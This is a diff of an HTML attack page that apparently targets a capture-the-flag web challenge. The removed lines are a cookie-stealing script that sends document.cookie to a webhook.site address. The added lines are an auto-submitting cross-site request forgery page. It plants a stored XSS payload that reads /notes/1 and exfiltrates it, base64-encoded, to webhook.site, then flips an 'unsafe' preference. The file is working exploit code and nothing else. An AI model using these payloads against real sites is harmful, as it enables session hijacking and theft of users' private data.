@@ -1,13 +1,16 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Testing Script</title>
-</head>
-<body>
-  <h1>Testing Cookie Steal</h1>
+<!doctype html>
+<form id=n action="http://simplechallenge.ctf.onl:7189/dashboard" method="post" style="display:none">
+    <input type=hidden name=content value='<script>fetch("/notes/1").then(r=>r.text()).then(t=>{new Image().src="https://webhook.site/863deed3-dfc1-4124-93dc-34453981eccb?d="+encodeURIComponent(btoa(t))})</script>'>
+  </form>
 
-  <script>
-    fetch('https://webhook.site/25e91a3a-4b92-40c9-98dc-f4e1a6bcde02/?c=' + document.cookie);
-  </script>
-</body>
-</html>
+<form id=u action="http://simplechallenge.ctf.onl:7189/prefs/unsafe" method="post" style="display:none">
+  <input type=hidden name=id value=2>
+  <input type=hidden name=enable value=1>
+</form>
+
+<script>
+const w=window.open('about:blank','noteWin');
+n.target=u.target='noteWin';
+n.submit();
+setTimeout(()=>u.submit(),400);
+</script>                                                          
